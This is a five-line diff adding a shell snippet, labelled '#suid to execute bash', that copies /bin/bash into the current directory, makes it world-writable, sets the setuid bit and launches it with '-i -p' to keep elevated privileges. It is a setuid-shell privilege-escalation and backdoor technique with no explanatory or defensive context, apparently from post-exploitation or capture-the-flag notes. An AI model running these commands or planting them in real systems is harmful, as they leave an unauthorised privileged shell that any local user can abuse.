@@ -1,0 +1,5 @@
+#suid to execute bash
+cp /bin/bash ./
+chmod 777 bash
+chmod u+s ./bash
+./bash -i -p
